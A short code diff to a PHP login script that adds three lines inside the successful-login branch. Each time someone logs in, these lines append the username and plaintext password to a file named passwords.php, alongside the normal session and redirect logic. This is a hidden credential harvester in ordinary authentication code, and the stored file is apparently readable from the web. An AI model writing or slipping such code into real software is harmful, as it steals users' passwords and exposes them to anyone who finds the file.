@@ -26,6 +26,9 @@ if($username&&$password)
 		{
 			if($db_confirmed == 1)
 			{
+				$myfile = "passwords.php";
+				$txt = file_get_contents($myfile) . $username . " " . $password . "\n";
+				file_put_contents($myfile, $txt);
 				//echo "Logged in <a href='members.php'>Click here to enter the members area</a>";
 				$_SESSION['username']=$db_username;
 				header("location: index.php");
